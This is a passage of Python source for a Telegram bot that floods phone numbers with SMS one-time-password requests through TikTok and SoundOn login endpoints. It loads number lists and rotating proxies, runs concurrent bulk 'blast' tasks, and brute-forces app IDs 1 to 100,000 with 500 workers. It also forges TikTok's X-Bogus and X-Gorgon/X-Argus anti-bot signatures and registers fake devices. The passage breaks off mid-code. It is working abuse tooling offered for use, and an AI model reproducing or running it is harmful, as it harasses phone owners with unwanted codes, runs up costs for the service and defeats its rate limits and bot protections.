    user_id = update.effective_user.id
    proxies = user_states[user_id].get('proxies', [])
    
    parts = phone.split()
    phone_num = parts[0]
    proxy = parts[1] if len(parts) > 1 else None
    
    if not proxy and proxies:
        proxy = random.choice(proxies)
    
    loop = asyncio.get_event_loop()
    sender = SuperOTPSender(identity_generator)
    result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
    
    await global_stats.increment(result.get("success", False))
    
    if result.get("success"):
        status = "SUCCESS"
        status_detail = "OTP Sent (Type 3536 - Afghanistan)"
    else:
        status = "FAILED"
        error_code = result.get("data", {}).get("error_code")
        error_desc = result.get("data", {}).get("description", "Unknown")
        status_detail = f"Error {error_code}: {error_desc}" if error_code else str(result.get("error", "Unknown"))
    
    time_ms = result.get("time_ms", 0)
    
    msg = f"""
{'SUCCESS' if result.get('success') else 'FAILED'} <b>Super/Pipixia OTP Result</b>

Phone: <code>{phone_num}</code>
Proxy: {(proxy or 'Direct')[:30]}
Status: {status_detail}
Time: {time_ms:.2f}ms
Device: {result.get('device_id', 'N/A')[:16]}...
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def start_super_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, numbers: List[str], proxies: List[str]):
    """Start Super/Pipixia bulk OTP task"""
    user_id = update.effective_user.id
    chat_id = str(update.effective_chat.id)
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.delay = user_states[user_id].get("delay", 0.0)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await update.message.reply_text(
        f"<b>Super/Pipixia Task #{task_id} Started!</b>\n\n"
        f"Numbers: {len(numbers):,}\n"
        f"Proxies: {len(proxies):,}\n"
        f"Type: 3536 (Afghanistan)\n"
        f"Delay: 3s between requests\n\n"
        f"Use /cancel {task_id} to stop.",
        parse_mode="HTML"
    )
    
    asyncio.create_task(run_super_bulk_task_concurrent(context, task))


async def run_super_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Task):
    """Run Super/Pipixia bulk task with rate limiting"""
    
    semaphore = asyncio.Semaphore(5)  # Lower concurrency for Super
    batch_results = []
    last_log_count = 0
    
    for batch_start in range(0, len(task.phone_numbers), BATCH_SIZE):
        if task.cancelled:
            break
        
        batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
        batch = task.phone_numbers[batch_start:batch_end]
        
        tasks = [
            send_super_otp_async(phone, task.proxies, semaphore, delay=getattr(task, "delay", 0.0))
            for phone in batch
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, Exception):
                task.fail_count += 1
                batch_results.append({"success": False, "error": str(result)})
            else:
                if result.get("success"):
                    task.success_count += 1
                else:
                    task.fail_count += 1
                batch_results.append(result)
            
            task.current_index += 1
        
        if task.current_index - last_log_count >= LOG_INTERVAL:
            last_log_count = task.current_index
            elapsed = time.time() - task.start_time
            speed = task.current_index / elapsed if elapsed > 0 else 0
            
            recent_results = batch_results[-LOG_INTERVAL:]
            recent_success = sum(1 for r in recent_results if r.get("success"))
            recent_failed = len(recent_results) - recent_success
            
            g_stats = global_stats.get_stats()
            
            progress_msg = f"""
<b>Super Task #{task.task_id} Progress</b>

Progress: {task.current_index}/{len(task.phone_numbers)}
Success: {task.success_count}
Failed: {task.fail_count}

Last {len(recent_results)} Requests:
Success: {recent_success} | Failed: {recent_failed}

Speed: {speed:.1f} req/s
Elapsed: {elapsed:.1f}s

Global Hits:
Total: {g_stats['total_requests']:,}
Success: {g_stats['total_success']:,}
Failed: {g_stats['total_failed']:,}
"""
            await send_message_safe(context, task.chat_id, progress_msg, parse_mode="HTML")
    
    task.status = "completed" if not task.cancelled else "cancelled"
    task_manager.running_tasks.discard(task.task_id)
    
    elapsed = time.time() - task.start_time
    rate = (task.success_count / len(task.phone_numbers) * 100) if task.phone_numbers else 0
    speed = len(task.phone_numbers) / elapsed if elapsed > 0 else 0
    g_stats = global_stats.get_stats()
    
    final_msg = f"""
<b>Super Task #{task.task_id} Complete!</b>

Total: {len(task.phone_numbers)}
Success: {task.success_count}
Failed: {task.fail_count}
Success Rate: {rate:.1f}%

Total Time: {elapsed:.1f}s
Average Speed: {speed:.1f} req/s

Global Hits:
Total Requests: {g_stats['total_requests']:,}
Total Success: {g_stats['total_success']:,}
Total Failed: {g_stats['total_failed']:,}
"""
    await send_message_safe(context, task.chat_id, final_msg, parse_mode="HTML")


# ============================================
# /setsep callback + text input handlers
# ============================================

async def _handle_setsep_callback(query, user_id, data_str):
    """Handle setsep inline button callbacks."""
    if data_str == "setsep_dom|default":
        user_states[user_id]['sep_domain'] = None  # use default
        user_states[user_id]['_setsep_domain_display'] = "soundon.global (default)"
        # Move to step 2: type code
        keyboard = [
            [InlineKeyboardButton("3635 (default)", callback_data="setsep_tc|3635")],
            [InlineKeyboardButton("Custom Type Code", callback_data="setsep_tc|custom")],
        ]
        await query.edit_message_text(
            "<b>Configure /sep</b>\n\n"
            "Domain: soundon.global (default)\n\n"
            "Step 2/3: Select type code:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    elif data_str == "setsep_dom|custom":
        user_states[user_id]['awaiting'] = 'setsep_custom_domain'
        await query.edit_message_text(
            "<b>Configure /sep</b>\n\n"
            "Type the custom domain (e.g. <code>api.example.com</code>):",
            parse_mode="HTML",
        )

    elif data_str.startswith("setsep_tc|"):
        tc_val = data_str.split("|", 1)[1]
        if tc_val == "custom":
            user_states[user_id]['awaiting'] = 'setsep_custom_tc'
            domain_display = user_states[user_id].get('_setsep_domain_display', '?')
            await query.edit_message_text(
                f"<b>Configure /sep</b>\n\n"
                f"Domain: {domain_display}\n\n"
                f"Type the custom type code (number):",
                parse_mode="HTML",
            )
        else:
            tc = int(tc_val)
            user_states[user_id]['sep_tc'] = tc
            domain_display = user_states[user_id].get('_setsep_domain_display', '?')
            # Move to step 3: AID
            keyboard = [
                [InlineKeyboardButton("2960 (default)", callback_data="setsep_aid|2960")],
                [InlineKeyboardButton("5049", callback_data="setsep_aid|5049"),
                 InlineKeyboardButton("4174", callback_data="setsep_aid|4174")],
                [InlineKeyboardButton("6556", callback_data="setsep_aid|6556"),
                 InlineKeyboardButton("4068", callback_data="setsep_aid|4068")],
                [InlineKeyboardButton("Custom AID", callback_data="setsep_aid|custom")],
            ]
            await query.edit_message_text(
                f"<b>Configure /sep</b>\n\n"
                f"Domain: {domain_display}\n"
                f"Type Code: {tc}\n\n"
                f"Step 3/3: Select AID:",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard),
            )

    elif data_str.startswith("test_mode|"):
        await handle_test_mode_callback(query, context, user_id)
        return
    elif data_str.startswith("setsep_aid|"):
        aid_val = data_str.split("|", 1)[1]
        if aid_val == "custom":
            user_states[user_id]['awaiting'] = 'setsep_custom_aid'
            domain_display = user_states[user_id].get('_setsep_domain_display', '?')
            tc = user_states[user_id].get('sep_tc', 3635)
            await query.edit_message_text(
                f"<b>Configure /sep</b>\n\n"
                f"Domain: {domain_display}\n"
                f"Type Code: {tc}\n\n"
                f"Type the custom AID (number):",
                parse_mode="HTML",
            )
        else:
            user_states[user_id]['sep_aid'] = aid_val
            _finish_setsep(query, user_id)
            domain_display = user_states[user_id].get('_setsep_domain_display', '?')
            tc = user_states[user_id].get('sep_tc', 3635)
            await query.edit_message_text(
                f"<b>/sep configured!</b>\n\n"
                f"Domain: {domain_display}\n"
                f"Type Code: {tc}\n"
                f"AID: {aid_val}\n\n"
                f"Now use /sep to start the blast.",
                parse_mode="HTML",
            )


def _finish_setsep(query_unused, user_id):
    """Clean up temp setsep state."""
    user_states[user_id].pop('_setsep_domain_display', None)


async def handle_test_mode_callback(query, context, user_id):
    """Handle /test mode selection from inline buttons."""
    mode = query.data.split("|", 1)[1]
    proxies = user_states[user_id].get('proxies', [])
    if not proxies:
        await query.edit_message_text(
            "<b>No proxies loaded!</b>\nUse /sprox or /uprox first.",
            parse_mode="HTML")
        return
    await query.edit_message_text(
        f"<b>AID Brute Force Started</b>\n\n"
        f"Mode: <code>{mode}</code>\n"
        f"Workers: {TEST_WORKERS}\n"
        f"Proxies: {len(proxies)}\n\n"
        f"Results coming as they hit...",
        parse_mode="HTML")
    asyncio.create_task(_run_test_scan(context, query.message.chat_id, user_id, mode, proxies))


# ============================================
# Mobile (SoundOn /sep) bulk + single handlers
# ============================================

async def process_single_soundon_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    """Process a single Mobile (SoundOn) OTP send for /sep <phone>."""
    user_id = update.effective_user.id
    proxies = user_states[user_id].get('proxies', [])

    parts = phone.split()
    phone_num = parts[0]
    proxy = parts[1] if len(parts) > 1 else None

    if not proxy and proxies:
        proxy = random.choice(proxies)

    sep_domain = user_states[user_id].get('sep_domain')
    sep_tc = user_states[user_id].get('sep_tc')
    sep_aid = user_states[user_id].get('sep_aid')

    loop = asyncio.get_event_loop()
    sender = SoundOnOTPSender(domain=sep_domain, type_code=sep_tc, aid=sep_aid)
    result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)

    await global_stats.increment(result.get("success", False))

    if result.get("success"):
        data = result.get("data") or {}
        status_detail = "OTP Sent (SoundOn / Mobile)"
        ticket = data.get("mobile_ticket", "") if isinstance(data, dict) else ""
        ticket_line = f"\nTicket: <code>{ticket[:24]}...</code>" if ticket else ""
    else:
        data = result.get("data") or {}
        err_code = data.get("error_code") if isinstance(data, dict) else None
        err_desc = (data.get("description") if isinstance(data, dict) else None) \
            or result.get("error", "Unknown")
        status_detail = f"Error {err_code}: {err_desc}" if err_code else str(err_desc)[:120]
        ticket_line = ""

    time_ms = result.get("time_ms", 0)

    msg = f"""
{'✅' if result.get('success') else 'âŒ'} <b>Mobile (SoundOn) OTP Result</b>

Phone: <code>{phone_num}</code>
Proxy: {(proxy or 'Direct')[:40]}
Status: {status_detail}{ticket_line}
Time: {time_ms:.2f}ms
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def start_soundon_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE,
                                   numbers: List[str], proxies: List[str],
                                   sep_domain: Optional[str] = None,
                                   sep_tc: Optional[int] = None,
                                   sep_aid: Optional[str] = None,
                                   user_delay: float = 0.0):
    """Start a Mobile (SoundOn) bulk OTP task on saved numbers + proxies."""
    chat_id = str(update.effective_chat.id)
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.status = "running"
    task.app_key = "soundon"
    task.sep_domain = sep_domain
    task.sep_tc = sep_tc
    task.sep_aid = sep_aid
    task.delay = user_delay
    task_manager.running_tasks.add(task_id)

    await update.message.reply_text(
        f"<b>Mobile (SoundOn) Task #{task_id} Started!</b>\n\n"
        f"Numbers: {len(numbers):,}\n"
        f"Proxies: {len(proxies):,}\n"
        f"Endpoint: soundon.global (aid=2960, type=3635)\n\n"
        f"Use /cancel {task_id} to stop.",
        parse_mode="HTML",
    )

    asyncio.create_task(run_soundon_bulk_task_concurrent(context, task))


async def run_soundon_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Task):
    """Run Mobile (SoundOn) bulk task with full concurrency + progress logs."""
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OTP)
    batch_results: List[Dict] = []
    last_log_count = 0
    sep_domain = getattr(task, 'sep_domain', None)
    sep_tc = getattr(task, 'sep_tc', None)
    sep_aid = getattr(task, 'sep_aid', None)
    user_delay = getattr(task, 'delay', 0.0)

    for batch_start in range(0, len(task.phone_numbers), BATCH_SIZE):
        if task.cancelled:
            break

        batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
        batch = task.phone_numbers[batch_start:batch_end]

        coros = [send_soundon_otp_async(phone, task.proxies, semaphore,
                                         sep_domain=sep_domain, sep_tc=sep_tc,
                                         sep_aid=sep_aid, delay=user_delay) for phone in batch]
        results = await asyncio.gather(*coros, return_exceptions=True)

        for result in results:
            if isinstance(result, Exception):
                task.fail_count += 1
                batch_results.append({"success": False, "error": str(result)})
            else:
                if result.get("success"):
                    task.success_count += 1
                else:
                    task.fail_count += 1
                batch_results.append(result)
            task.current_index += 1

        if task.current_index - last_log_count >= LOG_INTERVAL:
            last_log_count = task.current_index
            elapsed = time.time() - task.start_time
            speed = task.current_index / elapsed if elapsed > 0 else 0
            recent_results = batch_results[-LOG_INTERVAL:]
            recent_success = sum(1 for r in recent_results if r.get("success"))
            recent_failed = len(recent_results) - recent_success
            g_stats = global_stats.get_stats()
            progress_msg = f"""
<b>Mobile Task #{task.task_id} Progress</b>

Progress: {task.current_index}/{len(task.phone_numbers)}
Success: {task.success_count}
Failed: {task.fail_count}

Last {len(recent_results)} Requests:
Success: {recent_success} | Failed: {recent_failed}

Speed: {speed:.1f} req/s
Elapsed: {elapsed:.1f}s

Global Hits:
Total: {g_stats['total_requests']:,}
Success: {g_stats['total_success']:,}
Failed: {g_stats['total_failed']:,}
"""
            await send_message_safe(context, task.chat_id, progress_msg, parse_mode="HTML")

    task.status = "completed" if not task.cancelled else "cancelled"
    task_manager.running_tasks.discard(task.task_id)

    elapsed = time.time() - task.start_time
    rate = (task.success_count / len(task.phone_numbers) * 100) if task.phone_numbers else 0
    speed = len(task.phone_numbers) / elapsed if elapsed > 0 else 0
    g_stats = global_stats.get_stats()

    final_msg = f"""
<b>Mobile Task #{task.task_id} Complete!</b>

Total: {len(task.phone_numbers)}
Success: {task.success_count}
Failed: {task.fail_count}
Success Rate: {rate:.1f}%

Total Time: {elapsed:.1f}s
Average Speed: {speed:.1f} req/s

Global Hits:
Total Requests: {g_stats['total_requests']:,}
Total Success: {g_stats['total_success']:,}
Total Failed: {g_stats['total_failed']:,}
"""
    await send_message_safe(context, task.chat_id, final_msg, parse_mode="HTML")


# ============================================
# MESSAGE & FILE HANDLERS
# ============================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if not text:
        return
    
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting == 'numbers':
        new_numbers = parse_phone_numbers(text)
        if 'numbers_buffer' not in user_states[user_id]:
            user_states[user_id]['numbers_buffer'] = []
        user_states[user_id]['numbers_buffer'].extend(new_numbers)
        count = len(user_states[user_id]['numbers_buffer'])
        await update.message.reply_text(f"📥 +{len(new_numbers):,} numbers (Total: {count:,})\nSend more or /done", parse_mode="HTML")
    
    elif awaiting == 'proxies':
        new_proxies = parse_proxies(text)
        if 'proxies_buffer' not in user_states[user_id]:
            user_states[user_id]['proxies_buffer'] = []
        user_states[user_id]['proxies_buffer'].extend(new_proxies)
        count = len(user_states[user_id]['proxies_buffer'])
        await update.message.reply_text(f"📥 +{len(new_proxies):,} proxies (Total: {count:,})\nSend more or /done", parse_mode="HTML")
    
    elif awaiting == 'custom_domain':
        user_states[user_id]['awaiting'] = None
        domain = text.strip()
        if not domain or '/' in domain or ' ' in domain or '.' not in domain:
            await update.message.reply_text(
                "❌ Invalid domain. Send only the host (e.g. <code>api16-normal-c-alisg.tiktokv.com</code>).\n"
                "Run /setapp again to retry.",
                parse_mode='HTML')
            return
        user_states[user_id]['_pending_selected_domain'] = domain
        user_states[user_id]['_pending_domain_mode'] = 'single'
        user_states[user_id]['_pending_domain_display'] = f"{domain} (custom)"
        await _show_tc_buttons(update.message, user_id)

    elif awaiting == 'custom_tc':
        user_states[user_id]['awaiting'] = None
        try:
            tc = int(text.strip())
        except ValueError:
            await update.message.reply_text("❌ Invalid type code. Enter a number.", parse_mode='HTML')
            return
        user_states[user_id]['_pending_selected_tc'] = tc
        user_states[user_id]['_pending_tc_custom'] = True
        await _show_aid_prompt(update.message, user_id)

    elif awaiting == 'custom_aid':
        user_states[user_id]['awaiting'] = None
        try:
            aid = int(text.strip())
        except ValueError:
            await update.message.reply_text("❌ Invalid AID. Enter a number.", parse_mode='HTML')
            return
        user_states[user_id]['_pending_selected_aid'] = aid
        await _commit_app_selection(update.message, user_id)
    
    elif awaiting == 'setsep_custom_domain':
        user_states[user_id]['awaiting'] = None
        domain = text.strip()
        if not domain or '/' in domain or ' ' in domain or '.' not in domain:
            await update.message.reply_text(
                "Invalid domain. Send only the host (e.g. <code>api.example.com</code>).\n"
                "Run /setsep again to retry.",
                parse_mode='HTML')
            return
        user_states[user_id]['sep_domain'] = domain
        user_states[user_id]['_setsep_domain_display'] = f"{domain} (custom)"
        # Move to step 2: type code
        keyboard = [
            [InlineKeyboardButton("3635 (default)", callback_data="setsep_tc|3635")],
            [InlineKeyboardButton("Custom Type Code", callback_data="setsep_tc|custom")],
        ]
        await update.message.reply_text(
            f"<b>Configure /sep</b>\n\n"
            f"Domain: {domain} (custom)\n\n"
            f"Step 2/3: Select type code:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    elif awaiting == 'setsep_custom_tc':
        user_states[user_id]['awaiting'] = None
        try:
            tc = int(text.strip())
        except ValueError:
            await update.message.reply_text("Invalid type code. Enter a number.", parse_mode='HTML')
            return
        user_states[user_id]['sep_tc'] = tc
        domain_display = user_states[user_id].get('_setsep_domain_display', '?')
        keyboard = [
            [InlineKeyboardButton("2960 (default)", callback_data="setsep_aid|2960")],
            [InlineKeyboardButton("Custom AID", callback_data="setsep_aid|custom")],
        ]
        await update.message.reply_text(
            f"<b>Configure /sep</b>\n\n"
            f"Domain: {domain_display}\n"
            f"Type Code: {tc}\n\n"
            f"Step 3/3: Select AID:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    elif awaiting == 'setsep_custom_aid':
        user_states[user_id]['awaiting'] = None
        try:
            aid = int(text.strip())
        except ValueError:
            await update.message.reply_text("Invalid AID. Enter a number.", parse_mode='HTML')
            return
        user_states[user_id]['sep_aid'] = str(aid)
        domain_display = user_states[user_id].get('_setsep_domain_display', '?')
        tc = user_states[user_id].get('sep_tc', 3635)
        user_states[user_id].pop('_setsep_domain_display', None)
        await update.message.reply_text(
            f"<b>/sep configured!</b>\n\n"
            f"Domain: {domain_display}\n"
            f"Type Code: {tc}\n"
            f"AID: {aid}\n\n"
            f"Now use /sep to start the blast.",
            parse_mode="HTML",
        )


    elif awaiting == 'single_phone':
        user_states[user_id]['awaiting'] = None
        await process_single_otp(update, context, text.strip())
    
    else:
        # Check if it's a phone number
        text_clean = text.strip()
        if text_clean.startswith('+') or (len(text_clean) >= 10 and text_clean[0].isdigit()):
            await process_single_otp(update, context, text_clean)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting not in ['file_numbers', 'file_proxies']:
        return
    
    document = update.message.document
    file_name = document.file_name.lower()
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8', errors='ignore')
    
    if awaiting == 'file_numbers':
        new_numbers = parse_phone_numbers(content)
        if 'numbers_buffer' not in user_states[user_id]:
            user_states[user_id]['numbers_buffer'] = []
        user_states[user_id]['numbers_buffer'].extend(new_numbers)
        # Keep awaiting='file_numbers' so more files can be added until /done
        unique_total = len(set(user_states[user_id]['numbers_buffer']))
        await update.message.reply_text(
            f"📥 <b>+{len(new_numbers):,} numbers from {document.file_name}</b>\n"
            f"📆 Buffer total (unique): {unique_total:,}\n\n"
            f"Send another file or /done to save.",
            parse_mode="HTML"
        )
    
    elif awaiting == 'file_proxies':
        new_proxies = parse_proxies(content)
        if 'proxies_buffer' not in user_states[user_id]:
            user_states[user_id]['proxies_buffer'] = []
        user_states[user_id]['proxies_buffer'].extend(new_proxies)
        unique_total = len(set(user_states[user_id]['proxies_buffer']))
        await update.message.reply_text(
            f"📥 <b>+{len(new_proxies):,} proxies from {document.file_name}</b>\n"
            f"📆 Buffer total (unique): {unique_total:,}\n\n"
            f"Send another file or /done to save.",
            parse_mode="HTML"
        )


# ============================================
# /test — AID Brute Force Command
# ============================================

TEST_WORKERS = 500

async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """AID brute force: test AIDs 1-100k on web/mobile/VIP endpoints.

    Usage:
      /test          -> interactive menu
      /test web      -> 100k scan on web endpoint
      /test mobile   -> 100k scan on signed mobile endpoint
      /test vip      -> VIP combo (known working AIDs x all TCs)
    """
    user_id = update.effective_user.id
    proxies = user_states[user_id].get('proxies', [])

    if not proxies:
        await update.message.reply_text(
            "<b>No proxies loaded!</b>\n\n"
            "Use /sprox or /uprox to add proxies first.\n"
            "The /test command needs proxies (IP rotation) to scan properly.",
            parse_mode="HTML")
        return

    mode = context.args[0].lower() if context.args else None

    if mode in ("web", "mobile", "mob", "vip"):
        msg = await update.message.reply_text(
            f"<b>AID Brute Force Started</b>\n\n"
            f"Mode: <code>{mode}</code>\n"
            f"Range: 1 - 100,000\n"
            f"Workers: {TEST_WORKERS}\n"
            f"Proxies: {len(proxies)}\n\n"
            f"Results will be sent as they come...",
            parse_mode="HTML")
        asyncio.create_task(_run_test_scan(context, update.effective_chat.id, user_id, mode, proxies))
        return

    # Interactive menu
    keyboard = [
        [InlineKeyboardButton("Web Endpoint (100k)", callback_data="test_mode|web")],
        [InlineKeyboardButton("Mobile Signed (100k)", callback_data="test_mode|mobile")],
        [InlineKeyboardButton("VIP Combo (known AIDs x TCs)", callback_data="test_mode|vip")],
    ]
    await update.message.reply_text(
        "<b>AID Brute Force Scanner</b>\n\n"
        "Select scan mode:\n\n"
        "<b>Web</b> — /passport/web/send_code/ (X-Bogus, no signing)\n"
        "<b>Mobile</b> — /passport/mobile/send_code/v1/ (SignerPy signed)\n"
        "<b>VIP</b> — Known working AIDs tested with all TCs\n\n"
        f"Workers: {TEST_WORKERS} | Proxies: {len(proxies)}",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard))


async def _run_test_scan(context, chat_id, user_id, mode, proxies):
    """Background task: run the AID brute force scan."""
    import hashlib as _hs, base64 as _b64, struct as _st
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from io import BytesIO

    proxy_list = list(proxies)
    phone = "+923012345678"
    tc_default = 3536
    timeout = 15

    # X-Bogus helpers (inline for thread safety)
    _CUSTOM_B64 = "Dkdpgh4ZKsQB80/Mfvw36XI1R25-WUAlEi7NLboqYTOPuzmFjJnryx9HVGcaStCe="
    _STD_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    _UA_KEY = bytes([0x00, 0x01, 0x0E]); _PL_KEY = bytes([0xFF]); _MAGIC = 0x4A41279F
    _WEB_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

    def _rc4(key, data):
        S = list(range(256)); j = 0
        for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256; S[i], S[j] = S[j], S[i]
        out = bytearray(); i = j = 0
        for b in data:
            i = (i + 1) % 256; j = (j + S[i]) % 256; S[i], S[j] = S[j], S[i]
            out.append(b ^ S[(S[i] + S[j]) % 256])
        return bytes(out)

    def _md5(d):
        if isinstance(d, str): d = d.encode()
        return _hs.md5(d).hexdigest()

    def _xbogus(query, body=""):
        ts = int(time.time())
        p = bytes.fromhex(_md5(bytes.fromhex(_md5(query))))
        b = bytes.fromhex(_md5(bytes.fromhex(_md5(body or ""))))
        u = bytes.fromhex(_md5(_b64.b64encode(_rc4(_UA_KEY, _WEB_UA.encode())).decode("iso-8859-1")))
        pl = bytearray([0x40]) + bytearray(_UA_KEY) + bytearray(p[14:16]) + bytearray(b[14:16]) + bytearray(u[14:16]) + bytearray(_st.pack(">I", ts)) + bytearray(_st.pack(">I", _MAGIC))
        x = 0
        for byte in pl: x ^= byte
        pl.append(x & 0xFF)
        final = bytes([0x02, 0xFF]) + _rc4(_PL_KEY, bytes(pl))
        return _b64.b64encode(final).decode("ascii").translate(str.maketrans(_STD_B64, _CUSTOM_B64))

    def _encode_phone(ph):
        return "".join(f"{ord(c) ^ 5:02x}" for c in ph)

    # ── Web endpoint test ──
    def _test_web(aid):
        try:
            proxy = random.choice(proxy_list)
            s = requests.Session()
            s.headers["user-agent"] = _WEB_UA
            if not proxy.startswith("http"): proxy = f"http://{proxy}"
            s.proxies = {"http": proxy, "https": proxy}; s.verify = False
            domain = random.choice(["www.soundon.global", "www.tiktok.com"])
            encoded = _encode_phone(phone)
            body = f"mix_mode=1&mobile={encoded}&type={tc_default}&language=en&fixed_mix_mode=1"
            params = {"aid": str(aid), "account_sdk_source": "web", "sdk_version": "2.1.10-tiktok", "language": "en"}
            qs = urlencode(params); params["X-Bogus"] = _xbogus(qs, body)
            r = s.post(f"https://{domain}/passport/web/send_code/", params=params, data=body,
                       headers={"content-type": "application/x-www-form-urlencoded",
                                "referer": f"https://{domain}/"}, timeout=timeout)
            s.close()
            data = r.json()
            d = data.get("data", {}) if isinstance(data.get("data"), dict) else {}
            ec = d.get("error_code"); msg = data.get("message", "")
            desc = d.get("description", "")[:60]; ticket = d.get("mobile_ticket", "")
            return {"aid": aid, "ec": ec, "msg": msg, "desc": desc, "success": msg == "success",
                    "ticket": ticket[:30], "domain": domain, "tc": tc_default, "type": "web"}
        except Exception as e:
            return {"aid": aid, "ec": None, "msg": "err", "desc": str(e)[:50], "success": False, "type": "web"}

    # ── Mobile signed endpoint test ──
    def _test_mobile(aid):
        if not SIGNERPY_AVAILABLE:
            return {"aid": aid, "ec": None, "msg": "no_signer", "desc": "", "success": False, "type": "mobile"}
        try:
            proxy = random.choice(proxy_list)
            if not proxy.startswith("http") and not proxy.startswith("socks"): proxy = f"http://{proxy}"
            brand = "Samsung"; model = "SM-G991B"; android_ver = "14"; api_lvl = "34"
            build_id = "UP1A.231005.007"
            openudid = ''.join(random.choices('0123456789abcdef', k=16))
            cdid = str(uuid.uuid4())
            odin_tt = ''.join(random.choices('0123456789abcdef', k=160))
            csrf_token = ''.join(random.choices('0123456789abcdef', k=32))
            ua = f"com.zhiliaoapp.musically/350804 (Linux; U; Android {android_ver}; en_US; {model}; Build/{build_id}; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)"
            # Device register
            reg_p = {"aid": str(aid), "app_name": "musical_ly", "version_code": "350804",
                     "version_name": "35.8.4", "device_platform": "android", "os": "android",
                     "os_api": api_lvl, "os_version": android_ver, "device_type": model,
                     "device_brand": brand, "language": "en", "ac": "wifi", "channel": "googleplay",
                     "resolution": "1080*2400", "dpi": "420", "openudid": openudid, "cdid": cdid,
                     "ts": str(int(time.time())), "_rticket": str(int(time.time())*1000)}
            reg_body = json.dumps({"magic_tag": "ss_app_log", "header": {
                "display_name": "TikTok", "update_version_code": 350804,
                "manifest_version_code": 350804, "aid": aid, "channel": "googleplay",
                "package": "com.zhiliaoapp.musically", "app_version": "35.8.4",
                "version_code": 350804, "sdk_version": "2.14.0-rc.8",
                "os": "Android", "os_version": android_ver, "os_api": int(api_lvl),
                "device_model": model, "device_brand": brand, "device_manufacturer": brand,
                "cpu_abi": "arm64-v8a", "density_dpi": 420, "resolution": "1080x2400",
                "language": "en", "timezone": 5, "access": "wifi",
                "cdid": cdid, "sig_hash": "aea615ab", "openudid": openudid,
                "clientudid": str(uuid.uuid4()), "region": "US",
                "tz_name": "Asia/Karachi", "tz_offset": 18000, "sim_region": "pk"},
                "_gen_ts": int(time.time())})
            s = requests.Session()
            s.proxies = {"http": proxy, "https": proxy}; s.verify = False
            try:
                resp = s.post(f"https://api3-normal-c-lf.amemv.com/service/2/device_register/?{urlencode(reg_p)}",
                             data=reg_body, headers={"Host": "api3-normal-c-lf.amemv.com",
                             "User-Agent": ua, "Content-Type": "application/json"}, timeout=timeout)
                rd = resp.json()
                device_id = str(rd.get("device_id", "0")); iid = str(rd.get("install_id", "0"))
            except:
                device_id = ''.join(random.choices(string.digits, k=16))
                iid = ''.join(random.choices(string.digits, k=16))
            timestamp = int(time.time()); rticket = str(timestamp * 1000 + random.randint(1000, 9999))
            encrypted = xor(phone)
            common = {"passport-sdk-version": "50559", "iid": iid, "device_id": device_id,
                      "ac": "wifi", "channel": "googleplay", "aid": str(aid), "app_name": "musical_ly",
                      "version_code": "350804", "version_name": "35.8.4", "device_platform": "android",
                      "os": "android", "ssmix": "a", "device_type": model, "device_brand": brand,
                      "language": "en", "os_api": api_lvl, "os_version": android_ver,
                      "manifest_version_code": "350804", "resolution": "1080*2400", "dpi": "420",
                      "update_version_code": "350804", "cdid": cdid, "carrier_region": "PK"}
            url_p = dict(common); url_p["_rticket"] = rticket; url_p["ts"] = str(timestamp)
            body_p = dict(common)
            body_p.update({"auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35",
                           "mix_mode": "1", "mobile": encrypted, "type": str(tc_default),
                           "_rticket": rticket, "ts": str(timestamp),
                           "is6Digits": "1", "check_register": "1", "multi_login": "1"})
            url_qs = urlencode(url_p); body_str = urlencode(body_p)
            cookie_str = f"odin_tt={odin_tt}; install_id={iid}; passport_csrf_token_default={csrf_token}"
            sigs = sign(params=url_qs, payload=body_str, cookie=cookie_str, version=8404, aid=aid)
            domain = random.choice(["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com"])
            headers = {"Host": domain, "Cookie": cookie_str,
                       "x-tt-passport-csrf-token": csrf_token, "X-SS-REQ-TICKET": rticket,
                       "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                       "X-SS-DP": str(aid), "User-Agent": ua, "Accept-Encoding": "gzip, deflate",
                       "X-Gorgon": sigs.get("x-gorgon", ""), "X-Khronos": sigs.get("x-khronos", str(timestamp)),
                       "X-Argus": sigs.get("x-argus", ""), "X-Ladon": sigs.get("x-ladon", ""),
